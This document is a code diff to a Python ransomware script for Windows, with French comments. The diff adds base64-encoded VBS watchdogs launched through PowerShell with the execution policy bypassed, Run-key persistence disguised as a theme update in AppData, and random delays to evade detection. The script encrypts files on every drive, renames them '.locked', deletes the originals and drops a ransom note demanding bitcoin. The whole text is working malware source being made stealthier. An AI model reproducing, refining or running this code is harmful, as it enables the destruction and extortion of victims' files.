@@ -6,11 +6,14 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import multiprocessing
 import winreg
-import time
 import subprocess
+import secrets
+from queue import Empty
+import time
+import random
+import base64
 
-
-vbs_content = r'''
+vbs_template = r'''
 Set WshShell = CreateObject("WScript.Shell")
 Set WMI = GetObject("winmgmts:\\.\root\cimv2")
 
@@ -34,14 +37,10 @@ Do
 Loop
 '''
 
-# Clé et IV pour AES-256 CBC
 key = os.urandom(32)  # 256 bits
-iv = os.urandom(16)   # 128 bits
 
-# Extensions de fichiers à exclure
-extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".tmp")
+extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".locked", ".vbs")
 
-# Dossiers à exclure (en minuscules)
 folders_exclus = [
     "windows",
     "program files",
@@ -60,7 +59,7 @@ folders_exclus = [
     ".vscode"
 ]
 
-max_size = 100 * 1024 * 1024  # 100 Mo max
+vbsFile = []
 
 script_python_path = os.path.abspath(__file__)
 
@@ -71,37 +70,84 @@ target_dirs = [
     os.path.expandvars(r"%USERPROFILE%\Desktop"),
 ]
 
+def deleteVbsFileAfterFinish():
+    for file in vbsFile:
+        try:
+            if os.path.exists(file):
+                os.remove(file)
+                print(f"supprimer vbs avec success {file}")
+            else:
+                print(f"Fichier introuvable : {file}")
+        except Exception as e:
+            print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
+
 def create_watchdog_vbs(script_python_path, target_dirs):
+    script_final = vbs_template.format(script_python_path.replace("\\", "\\\\"))
+    b64_vbs = base64.b64encode(script_final.encode()).decode()
     for folder in target_dirs:
         try:
             if not os.path.exists(folder):
                 os.makedirs(folder)
-            vbs_path = os.path.join(folder, "watchdog.vbs")
-            with open(vbs_path, "w", encoding="utf-8") as f:
-                f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
+
+            random_name = f"watchdog_{secrets.token_hex(4)}.vbs"
+            vbs_path = os.path.join(folder, random_name)
+            vbsFile.append(vbs_path)
+
+            #mettre vbs en memoire avec base64 
+            powershell_command = f'''
+            powershell -ExecutionPolicy Bypass -NoProfile -Command "$b64 = '{b64_vbs}'; 
+            $vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); 
+            [System.IO.File]::WriteAllText('{vbs_path}', $vbs); 
+            Start-Process 'wscript.exe' '{vbs_path}'"
+            '''
+            subprocess.Popen(powershell_command, shell=True)
+            #with open(vbs_path, "w", encoding="utf-8") as f:
+            #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
             print(f"[+] Watchdog créé dans {vbs_path}")
-        except Exception as e:
+        except Exception as e:  
             print(f"[!] Erreur création watchdog dans {folder}: {e}")
 
-def lancer_watchdogs(dirs):
-    for folder in dirs:
-        vbs_path = os.path.join(folder, "watchdog.vbs")
+def lancer_watchdogs():
+    for vbs_path in vbsFile:
         if os.path.exists(vbs_path):
             subprocess.Popen(["wscript.exe", vbs_path], shell=False)
 
-def ajouter_run_key():
-    try:
-        nom_valeur = "MonScriptAuto"
-        chemin_script = os.path.join(os.path.dirname(os.path.realpath(__file__)), "monScript.vbs")
+def ajouter_run_key_vbs_relatif():
+    hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
+    os.makedirs(hidden_dir, exist_ok=True)
 
+    nom_valeur = "MonScriptAuto"
+
+    # Chemin relatif vers le script à exécuter (ici .py, mais tu peux mettre .exe ou .bat)
+    current_dir = os.path.dirname(os.path.realpath(__file__))
+    chemin_script_python = os.path.join(hidden_dir, "encoder.py")
+
+    # Contenu du VBS (avec chemin relatif)
+    vbs_template = f'''
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "pythonw.exe {chemin_script_python}", 0, False
+'''
+
+    # Encoder en Base64
+    b64_vbs = base64.b64encode(vbs_template.encode()).decode()
+
+    # Créer le fichier VBS à côté du script actuel
+    chemin_script = os.path.join(hidden_dir, "theme_update.vbs")
+
+    # Écrire le fichier VBS en le décodant depuis Base64
+    with open(chemin_script, "w", encoding="utf-8") as f:
+        f.write(base64.b64decode(b64_vbs).decode())
+
+    # Ajouter au registre (Run key)
+    try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
         winreg.CloseKey(key)
-        print("[+] Ajouté au démarrage avec Run Key.")
+        print("[+] Clé Run ajoutée avec succès.")
     except Exception as e:
-        print(f"[!] Erreur ajout Run Key : {e}")
+        print(f"[!] Erreur lors de l'ajout dans le registre : {e}")
 
 def is_in_excluded_folder(file_path: Path):
     try:
@@ -125,6 +171,7 @@ def get_existing_root_path():
 
 def encrypte_file(input_file):
     backend = default_backend()
+    iv = os.urandom(16)
     with open(input_file, 'rb') as f:
         data = f.read()
 
@@ -135,71 +182,107 @@ def encrypte_file(input_file):
     encryptor = cipher.encryptor()
     encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
 
-    output_file = input_file + ".tmp"
+    output_file = input_file + ".locked"
 
     with open(output_file, 'wb') as f:
         f.write(iv + encrypted_data)
 
     os.remove(input_file)
-    print(f"[✓] Fichier chiffré : {input_file}")
+    print(f"Fichier chiffré : {input_file}")
     return True
 
-# --- Nouveau : worker consommateur qui lit dans queue ---
 def worker(queue):
     while True:
-        file = queue.get()
-        if file is None:  # signal fin
+        try:
+            file = queue.get(timeout=10)
+        except Empty:
+            break
+        if file is None:
             break
         try:
             if is_in_excluded_folder(file):
                 continue
-            if file.is_file() and file.suffix.lower() not in extensions_exclues and file.stat().st_size < max_size:
+            if file.is_file() and file.suffix.lower() not in extensions_exclues :
                 encrypte_file(str(file))
+                # Pause aléatoire entre 0.5 et 3 secondes
+                time.sleep(random.uniform(0.5, 3))
         except Exception as e:
             print(f"[!] Erreur sur {file}: {e}")
 
-# --- Nouvelle version optimisée ---
 def process_par_lecteur(chemin, nb_process=5):
     chemin = Path(chemin)
-    queue = multiprocessing.Queue(maxsize=100)  # limite la mémoire utilisée
+    queue = multiprocessing.Queue(maxsize=100)
 
-    # Démarrage workers
     processus = []
     for _ in range(nb_process):
         p = multiprocessing.Process(target=worker, args=(queue,))
         p.start()
         processus.append(p)
 
-    # Producteur : ajoute fichiers dans la queue
     for file in chemin.rglob("*"):
         try:
             queue.put(file)
         except Exception as e:
             print(f"[!] Erreur ajout fichier à la queue: {e}")
 
-    # Envoie signal fin aux workers
     for _ in range(nb_process):
         queue.put(None)
 
-    # Attend fin des workers
+    while True:
+        all_finished = True
+        for i, p in enumerate(processus):
+            if not p.is_alive():
+                # Worker mort, relancer
+                print(f"[!] Worker {i} mort, redémarrage...")
+                # Relancer worker
+                new_p = multiprocessing.Process(target=worker, args=(queue,))
+                new_p.start()
+                processus[i] = new_p
+            else:
+                all_finished = False
+        if all_finished:
+            break
+        time.sleep(10)  # pause avant p
+
     for p in processus:
         p.join()
+        
+def afficher_ransom_note(lecteurs):
+    note = """Vos fichiers ont été chiffrés.
+Veuillez envoyer 0.5 BTC à l'adresse XXXXXXXX pour obtenir la clé."""
+    for folder in lecteurs:
+        path = os.path.join(folder, "README.txt")
+        try:
+            with open(path, "w") as f:
+                f.write(note)
+        except:
+            continue
 
 def main():
-    ajouter_run_key()
+    time.sleep(random.uniform(5, 15))
+    existDir = os.path.dirname(os.path.abspath(__file__))
+    if existDir.lower() not in folders_exclus:
+        folders_exclus.append(existDir.lower())
+
+    ajouter_run_key_vbs_relatif()
     create_watchdog_vbs(script_python_path, target_dirs)
-    lancer_watchdogs(target_dirs)
+    lancer_watchdogs()
+
     lecteurs = get_existing_root_path()
+    nb_cpu = multiprocessing.cpu_count()
     processus_lecteurs = []
 
     for lecteur in lecteurs:
-        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur,))
+        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur, nb_cpu))
         p.start()
         processus_lecteurs.append(p)
 
     for p in processus_lecteurs:
         p.join()
 
+    deleteVbsFileAfterFinish()
+    afficher_ransom_note(lecteurs)
+
 if __name__ == "__main__":
-    multiprocessing.    ()
-    main()
+    multiprocessing.freeze_support()
+    main()  
